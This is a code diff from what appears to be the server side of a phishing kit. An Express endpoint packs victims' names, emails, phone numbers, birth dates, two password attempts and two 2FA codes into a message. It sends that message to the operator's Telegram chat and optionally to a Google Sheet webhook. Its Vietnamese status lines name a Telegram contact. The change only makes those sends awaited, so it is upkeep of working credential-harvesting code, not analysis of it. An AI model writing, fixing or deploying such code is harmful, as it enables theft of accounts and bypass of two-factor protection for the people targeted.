@@ -115,7 +115,7 @@ app.post('/api/get-info', ipFilter, registerLimiter, async (req, res) => {
         });
 
         const message = `<b>Ip:</b> <code>${values.user_ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n<b>Location:</b> <code>${values.ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n-----------------------------\n<b>Name:</b> <code>${values.name || ''}</code>\n<b>Email:</b> <code>${values.email || ''}</code>\n<b>Email business:</b> <code>${values.email_business || ''}</code>\n<b>Phone:</b> <code>${values.phone || ''}</code>\n<b>Page:</b> <code>${values.page || ''}</code>\n<b>Date of birth:</b> <code>${values.day}/${values.month}/${values.year}</code>\n<b>Password First:</b> <code>${values.password || ''}</code>\n<b>Password Second:</b> <code>${values.secondPassword || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.twoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
-        bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: "html" });
+        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: "html" });
 
         if (process.env.WEBHOOK_URL) {
             const url = new URL(process.env.WEBHOOK_URL);
@@ -133,14 +133,14 @@ app.post('/api/get-info', ipFilter, registerLimiter, async (req, res) => {
             url.searchParams.append('Second Two-Fa', values.secondTwoFa ? values.secondTwoFa : '');
 
             try {
-                bot.sendMessage(process.env.TELEGRAM_CHAT_ID, '✅ Thêm dữ liệu vào Sheet thành công.');
+                await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, '✅ Thêm dữ liệu vào Sheet thành công.');
             } catch (err) {
-                bot.sendMessage(process.env.TELEGRAM_CHAT_ID, '❌ Thêm vào Google Sheet không thành công, liên hệ <code>@otis_cua</code>', { parse_mode: 'html' });
+                await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, '❌ Thêm vào Google Sheet không thành công, liên hệ <code>@otis_cua</code>', { parse_mode: 'html' });
             }
         }
 
     } catch (error) {
-        bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `❌ Server giải mã dữ liệu không thành công, liên hệ <code>@otis_cua</code>.Mã lỗi: ${error.message}`, { parse_mode: 'html' });
+        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `❌ Server giải mã dữ liệu không thành công, liên hệ <code>@otis_cua</code>.Mã lỗi: ${error.message}`, { parse_mode: 'html' });
         res.status(500).json({
             message: 'Error',
             error_code: 1
